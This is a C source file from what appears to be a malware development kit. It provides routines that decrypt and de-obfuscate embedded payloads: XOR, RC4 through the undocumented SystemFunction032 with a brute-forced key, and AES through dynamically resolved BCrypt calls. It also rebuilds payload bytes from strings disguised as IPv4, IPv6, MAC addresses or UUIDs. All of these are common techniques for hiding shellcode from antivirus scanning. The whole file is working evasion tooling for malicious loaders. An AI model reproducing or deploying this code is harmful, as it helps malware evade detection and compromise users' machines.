// MDK
// docs    : https://sebafvs.com/mdk/encode
// author  : @sebafvs

#include <windows.h>
#include "mdk/encode.h"
#include "mdk/nt.h"
#include "mdk/utils.h"

void mdk_xor(IN const BYTE* key, IN SIZE_T key_size, IN OUT BYTE* payload, IN SIZE_T payload_size) {
    for (SIZE_T i = 0; i < payload_size; i++) { payload[i] ^= key[i % key_size]; }
}

typedef struct {
    ULONG Length;
    ULONG MaximumLength;
    PVOID Buffer;
} _MDK_USTRING;

typedef NTSTATUS(NTAPI* pfnSystemFunction032)(_MDK_USTRING* data, _MDK_USTRING* key);

MDK_RESULT mdk_rc4_brute(IN const BYTE* protected_key, IN SIZE_T key_size, IN BYTE hint_byte, OUT BYTE* real_key) {

    BYTE b = 0;

    while (1) {
        if (((protected_key[0] ^ b) - 0) == hint_byte) { break; }
        b++;
    }

    for (SIZE_T i = 0; i < key_size; i++) {
        real_key[i] = (BYTE)((protected_key[i] ^ b) - i);
    }

    return MDK_MAKE_OK();
}

MDK_RESULT mdk_rc4_decrypt(IN const BYTE* key, IN SIZE_T key_size, IN OUT BYTE* payload, IN SIZE_T payload_size) {

    // SystemFunction032 is a forwarded export in Advapi32, must load Cryptsp directly.
    HMODULE cryptsp_module = LoadLibraryA("Cryptsp");
    if (!cryptsp_module) { return MDK_MAKE_FAIL("LoadLibraryA(Cryptsp)", MDK_STATUS_UNSUCCESSFUL); }

    pfnSystemFunction032 rc4_function = (pfnSystemFunction032)GetProcAddress(cryptsp_module, "SystemFunction032");
    if (!rc4_function) {
        FreeLibrary(cryptsp_module);
        return MDK_MAKE_FAIL("GetProcAddress(SystemFunction032)", MDK_STATUS_UNSUCCESSFUL);
    }

    _MDK_USTRING data_block = { .Length = (ULONG)payload_size, .MaximumLength = (ULONG)payload_size, .Buffer = payload };
    _MDK_USTRING key_block  = { .Length = (ULONG)key_size,     .MaximumLength = (ULONG)key_size,     .Buffer = (PVOID)key };

    NTSTATUS status = rc4_function(&data_block, &key_block);

    FreeLibrary(cryptsp_module);

    if (status) { return MDK_MAKE_FAIL("SystemFunction032", status); }

    return MDK_MAKE_OK();
}

// BCrypt handle types, avoid pulling in bcrypt.h
typedef PVOID _MDK_BCRYPT_ALG_HANDLE;
typedef PVOID _MDK_BCRYPT_KEY_HANDLE;

typedef NTSTATUS(WINAPI* pfnBCryptOpenAlgorithmProvider)(_MDK_BCRYPT_ALG_HANDLE*, LPCWSTR, LPCWSTR, ULONG);
typedef NTSTATUS(WINAPI* pfnBCryptSetProperty)(PVOID, LPCWSTR, PUCHAR, ULONG, ULONG);
typedef NTSTATUS(WINAPI* pfnBCryptGenerateSymmetricKey)(_MDK_BCRYPT_ALG_HANDLE, _MDK_BCRYPT_KEY_HANDLE*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
typedef NTSTATUS(WINAPI* pfnBCryptDecrypt)(_MDK_BCRYPT_KEY_HANDLE, PUCHAR, ULONG, PVOID, PUCHAR, ULONG, PUCHAR, ULONG, ULONG*, ULONG);
typedef NTSTATUS(WINAPI* pfnBCryptDestroyKey)(_MDK_BCRYPT_KEY_HANDLE);
typedef NTSTATUS(WINAPI* pfnBCryptCloseAlgorithmProvider)(_MDK_BCRYPT_ALG_HANDLE, ULONG);

MDK_RESULT mdk_aes_decrypt(IN const BYTE* key, IN SIZE_T key_size, IN const BYTE* iv, IN OUT BYTE* payload, IN SIZE_T payload_size) {

    HMODULE bcrypt_module = LoadLibraryA("Bcrypt.dll");
    if (!bcrypt_module) { return MDK_MAKE_FAIL("LoadLibraryA(Bcrypt)", MDK_STATUS_UNSUCCESSFUL); }

    pfnBCryptOpenAlgorithmProvider  fn_open  = (pfnBCryptOpenAlgorithmProvider)GetProcAddress(bcrypt_module, "BCryptOpenAlgorithmProvider");
    pfnBCryptSetProperty            fn_set   = (pfnBCryptSetProperty)GetProcAddress(bcrypt_module, "BCryptSetProperty");
    pfnBCryptGenerateSymmetricKey   fn_gen   = (pfnBCryptGenerateSymmetricKey)GetProcAddress(bcrypt_module, "BCryptGenerateSymmetricKey");
    pfnBCryptDecrypt                fn_dec   = (pfnBCryptDecrypt)GetProcAddress(bcrypt_module, "BCryptDecrypt");
    pfnBCryptDestroyKey             fn_dkey  = (pfnBCryptDestroyKey)GetProcAddress(bcrypt_module, "BCryptDestroyKey");
    pfnBCryptCloseAlgorithmProvider fn_close = (pfnBCryptCloseAlgorithmProvider)GetProcAddress(bcrypt_module, "BCryptCloseAlgorithmProvider");

    if (!fn_open || !fn_set || !fn_gen || !fn_dec || !fn_dkey || !fn_close) {
        FreeLibrary(bcrypt_module);
        return MDK_MAKE_FAIL("GetProcAddress(Bcrypt)", MDK_STATUS_ENTRYPOINT_NOT_FOUND);
    }

    _MDK_BCRYPT_ALG_HANDLE hAlgorithm = NULL;
    _MDK_BCRYPT_KEY_HANDLE hKey       = NULL;
    NTSTATUS               status     = 0;
    MDK_RESULT             result     = MDK_MAKE_OK();

    // BCryptDecrypt modifies the IV in place, work on a copy
    BYTE iv_copy[16] = { 0 };
    mdk_memcpy(iv_copy, iv, 16);

    // L"AES" = BCRYPT_AES_ALGORITHM
    status = fn_open(&hAlgorithm, L"AES", NULL, 0);
    if (status) { result = MDK_MAKE_FAIL("BCryptOpenAlgorithmProvider", status); goto _cleanup; }

    // L"ChainingMode" = BCRYPT_CHAINING_MODE, L"ChainingModeCBC" = BCRYPT_CHAIN_MODE_CBC
    status = fn_set(hAlgorithm, L"ChainingMode", (PUCHAR)L"ChainingModeCBC", (ULONG)sizeof(L"ChainingModeCBC"), 0);
    if (status) { result = MDK_MAKE_FAIL("BCryptSetProperty(CBC)", status); goto _cleanup; }

    status = fn_gen(hAlgorithm, &hKey, NULL, 0, (PUCHAR)key, (ULONG)key_size, 0);
    if (status) { result = MDK_MAKE_FAIL("BCryptGenerateSymmetricKey", status); goto _cleanup; }

    ULONG bytes_written = 0;
    // BCRYPT_BLOCK_PADDING = 0x00000001
    status = fn_dec(hKey, (PUCHAR)payload, (ULONG)payload_size, NULL, iv_copy, 16, (PUCHAR)payload, (ULONG)payload_size, &bytes_written, 0x00000001);
    if (status) { result = MDK_MAKE_FAIL("BCryptDecrypt", status); }

_cleanup:
    if (hKey)       { fn_dkey(hKey); }
    if (hAlgorithm) { fn_close(hAlgorithm, 0); }
    FreeLibrary(bcrypt_module);
    return result;
}

// Internal address structs, avoids ws2tcpip.h / mstcpip.h include order issues
typedef struct { BYTE bytes[4];  } _MDK_IPV4;
typedef struct { BYTE bytes[16]; } _MDK_IPV6;
typedef struct { BYTE bytes[6];  } _MDK_MAC;

typedef NTSTATUS(NTAPI* pfnRtlIpv4StringToAddressA)(PCSTR, BOOLEAN, PCSTR*, _MDK_IPV4*);
typedef NTSTATUS(NTAPI* pfnRtlIpv6StringToAddressA)(PCSTR, PCSTR*, _MDK_IPV6*);
typedef NTSTATUS(NTAPI* pfnRtlEthernetStringToAddressA)(PCSTR, PCSTR*, _MDK_MAC*);

MDK_RESULT mdk_ipv4_deobfuscate(IN const char** ipv4_array, IN SIZE_T count, OUT BYTE* payload) {

    HMODULE ntdll_module = GetModuleHandleA("ntdll.dll");
    if (!ntdll_module) { return MDK_MAKE_FAIL("GetModuleHandleA(ntdll)", MDK_STATUS_DLL_NOT_FOUND); }

    pfnRtlIpv4StringToAddressA fn_parse = (pfnRtlIpv4StringToAddressA)GetProcAddress(ntdll_module, "RtlIpv4StringToAddressA");
    if (!fn_parse) { return MDK_MAKE_FAIL("GetProcAddress(RtlIpv4StringToAddressA)", MDK_STATUS_ENTRYPOINT_NOT_FOUND); }

    for (SIZE_T i = 0; i < count; i++) {
        _MDK_IPV4 addr      = { 0 };
        PCSTR     remaining = NULL;
        NTSTATUS  status    = fn_parse(ipv4_array[i], TRUE, &remaining, &addr);
        if (status) { return MDK_MAKE_FAIL("RtlIpv4StringToAddressA", status); }
        mdk_memcpy(payload + (i * 4), addr.bytes, 4);
    }

    return MDK_MAKE_OK();
}

MDK_RESULT mdk_ipv6_deobfuscate(IN const char** ipv6_array, IN SIZE_T count, OUT BYTE* payload) {

    HMODULE ntdll_module = GetModuleHandleA("ntdll.dll");
    if (!ntdll_module) { return MDK_MAKE_FAIL("GetModuleHandleA(ntdll)", MDK_STATUS_DLL_NOT_FOUND); }

    pfnRtlIpv6StringToAddressA fn_parse = (pfnRtlIpv6StringToAddressA)GetProcAddress(ntdll_module, "RtlIpv6StringToAddressA");
    if (!fn_parse) { return MDK_MAKE_FAIL("GetProcAddress(RtlIpv6StringToAddressA)", MDK_STATUS_ENTRYPOINT_NOT_FOUND); }

    for (SIZE_T i = 0; i < count; i++) {
        _MDK_IPV6 addr      = { 0 };
        PCSTR     remaining = NULL;
        NTSTATUS  status    = fn_parse(ipv6_array[i], &remaining, &addr);
        if (status) { return MDK_MAKE_FAIL("RtlIpv6StringToAddressA", status); }
        mdk_memcpy(payload + (i * 16), addr.bytes, 16);
    }

    return MDK_MAKE_OK();
}

MDK_RESULT mdk_mac_deobfuscate(IN const char** mac_array, IN SIZE_T count, OUT BYTE* payload) {

    HMODULE ntdll_module = GetModuleHandleA("ntdll.dll");
    if (!ntdll_module) { return MDK_MAKE_FAIL("GetModuleHandleA(ntdll)", MDK_STATUS_DLL_NOT_FOUND); }

    pfnRtlEthernetStringToAddressA fn_parse = (pfnRtlEthernetStringToAddressA)GetProcAddress(ntdll_module, "RtlEthernetStringToAddressA");
    if (!fn_parse) { return MDK_MAKE_FAIL("GetProcAddress(RtlEthernetStringToAddressA)", MDK_STATUS_ENTRYPOINT_NOT_FOUND); }

    for (SIZE_T i = 0; i < count; i++) {
        _MDK_MAC addr      = { 0 };
        PCSTR    remaining = NULL;
        NTSTATUS status    = fn_parse(mac_array[i], &remaining, &addr);
        if (status) { return MDK_MAKE_FAIL("RtlEthernetStringToAddressA", status); }
        mdk_memcpy(payload + (i * 6), addr.bytes, 6);
    }

    return MDK_MAKE_OK();
}

// RPC_STATUS is LONG; UUID == GUID from windows.h
typedef LONG(WINAPI* pfnUuidFromStringA)(const UCHAR*, GUID*);

MDK_RESULT mdk_uuid_deobfuscate(IN const char** uuid_array, IN SIZE_T count, OUT BYTE* payload) {

    HMODULE rpcrt_module = LoadLibraryA("Rpcrt4.dll");
    if (!rpcrt_module) { return MDK_MAKE_FAIL("LoadLibraryA(Rpcrt4)", MDK_STATUS_DLL_NOT_FOUND); }

    pfnUuidFromStringA fn_parse = (pfnUuidFromStringA)GetProcAddress(rpcrt_module, "UuidFromStringA");
    if (!fn_parse) {
        FreeLibrary(rpcrt_module);
        return MDK_MAKE_FAIL("GetProcAddress(UuidFromStringA)", MDK_STATUS_ENTRYPOINT_NOT_FOUND);
    }

    for (SIZE_T i = 0; i < count; i++) {
        GUID uuid   = { 0 };
        LONG status = fn_parse((const UCHAR*)uuid_array[i], &uuid);
        if (status != 0) {
            FreeLibrary(rpcrt_module);
            return MDK_MAKE_FAIL("UuidFromStringA", MDK_STATUS_UNSUCCESSFUL);
        }
        mdk_memcpy(payload + (i * 16), &uuid, 16);
    }

    FreeLibrary(rpcrt_module);
    return MDK_MAKE_OK();
}
